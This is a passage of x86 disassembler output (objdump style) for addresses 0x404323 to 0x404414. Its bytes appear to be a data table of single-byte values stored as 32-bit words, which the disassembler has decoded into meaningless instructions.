  404323:	00 94 00 00 00 72 00 	add    %dl,0x720000(%eax,%eax,1)
  40432a:	00 00                	add    %al,(%eax)
  40432c:	21 00                	and    %eax,(%eax)
  40432e:	00 00                	add    %al,(%eax)
  404330:	76 00                	jbe    0x404332
  404332:	00 00                	add    %al,(%eax)
  404334:	7e 00                	jle    0x404336
  404336:	00 00                	add    %al,(%eax)
  404338:	6b 00 00             	imul   $0x0,(%eax),%eax
  40433b:	00 33                	add    %dh,(%ebx)
  40433d:	00 00                	add    %al,(%eax)
  40433f:	00 fb                	add    %bh,%bl
  404341:	00 00                	add    %al,(%eax)
  404343:	00 eb                	add    %ch,%bl
  404345:	00 00                	add    %al,(%eax)
  404347:	00 0a                	add    %cl,(%edx)
  404349:	00 00                	add    %al,(%eax)
  40434b:	00 39                	add    %bh,(%ecx)
  40434d:	00 00                	add    %al,(%eax)
  40434f:	00 57 00             	add    %dl,0x0(%edi)
  404352:	00 00                	add    %al,(%eax)
  404354:	2a 00                	sub    (%eax),%al
  404356:	00 00                	add    %al,(%eax)
  404358:	52                   	push   %edx
  404359:	00 00                	add    %al,(%eax)
  40435b:	00 5f 00             	add    %bl,0x0(%edi)
  40435e:	00 00                	add    %al,(%eax)
  404360:	b3 00                	mov    $0x0,%bl
  404362:	00 00                	add    %al,(%eax)
  404364:	d0 00                	rolb   $1,(%eax)
  404366:	00 00                	add    %al,(%eax)
  404368:	41                   	inc    %ecx
  404369:	00 00                	add    %al,(%eax)
  40436b:	00 55 00             	add    %dl,0x0(%ebp)
  40436e:	00 00                	add    %al,(%eax)
  404370:	54                   	push   %esp
  404371:	00 00                	add    %al,(%eax)
  404373:	00 bd 00 00 00 9b    	add    %bh,-0x65000000(%ebp)
  404379:	00 00                	add    %al,(%eax)
  40437b:	00 48 00             	add    %cl,0x0(%eax)
  40437e:	00 00                	add    %al,(%eax)
  404380:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404381:	00 00                	add    %al,(%eax)
  404383:	00 e7                	add    %ah,%bh
  404385:	00 00                	add    %al,(%eax)
  404387:	00 8b 00 00 00 e8    	add    %cl,-0x18000000(%ebx)
  40438d:	00 00                	add    %al,(%eax)
  40438f:	00 c2                	add    %al,%dl
  404391:	00 00                	add    %al,(%eax)
  404393:	00 c9                	add    %cl,%cl
  404395:	00 00                	add    %al,(%eax)
  404397:	00 43 00             	add    %al,0x0(%ebx)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	fa                   	cli
  40439d:	00 00                	add    %al,(%eax)
  40439f:	00 f9                	add    %bh,%cl
  4043a1:	00 00                	add    %al,(%eax)
  4043a3:	00 1a                	add    %bl,(%edx)
  4043a5:	00 00                	add    %al,(%eax)
  4043a7:	00 28                	add    %ch,(%eax)
  4043a9:	00 00                	add    %al,(%eax)
  4043ab:	00 b1 00 00 00 81    	add    %dh,-0x7f000000(%ecx)
  4043b1:	00 00                	add    %al,(%eax)
  4043b3:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4043b7:	00 97 00 00 00 80    	add    %dl,-0x80000000(%edi)
  4043bd:	00 00                	add    %al,(%eax)
  4043bf:	00 f5                	add    %dh,%ch
  4043c1:	00 00                	add    %al,(%eax)
  4043c3:	00 b5 00 00 00 12    	add    %dh,0x12000000(%ebp)
  4043c9:	00 00                	add    %al,(%eax)
  4043cb:	00 7f 00             	add    %bh,0x0(%edi)
  4043ce:	00 00                	add    %al,(%eax)
  4043d0:	1b 00                	sbb    (%eax),%eax
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	a0 00 00 00 96       	mov    0x96000000,%al
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	00 68 00             	add    %ch,0x0(%eax)
  4043de:	00 00                	add    %al,(%eax)
  4043e0:	35 00 00 00 60       	xor    $0x60000000,%eax
  4043e5:	00 00                	add    %al,(%eax)
  4043e7:	00 95 00 00 00 ab    	add    %dl,-0x55000000(%ebp)
  4043ed:	00 00                	add    %al,(%eax)
  4043ef:	00 a8 00 00 00 8f    	add    %ch,-0x71000000(%eax)
  4043f5:	00 00                	add    %al,(%eax)
  4043f7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4043fa:	00 00                	add    %al,(%eax)
  4043fc:	ed                   	in     (%dx),%eax
  4043fd:	00 00                	add    %al,(%eax)
  4043ff:	00 3d 00 00 00 9a    	add    %bh,0x9a000000
  404405:	00 00                	add    %al,(%eax)
  404407:	00 84 00 00 00 78 00 	add    %al,0x780000(%eax,%eax,1)
  40440e:	00 00                	add    %al,(%eax)
  404410:	23 00                	and    (%eax),%eax
  404412:	00 00                	add    %al,(%eax)
  404414:	99                   	cltd
	...
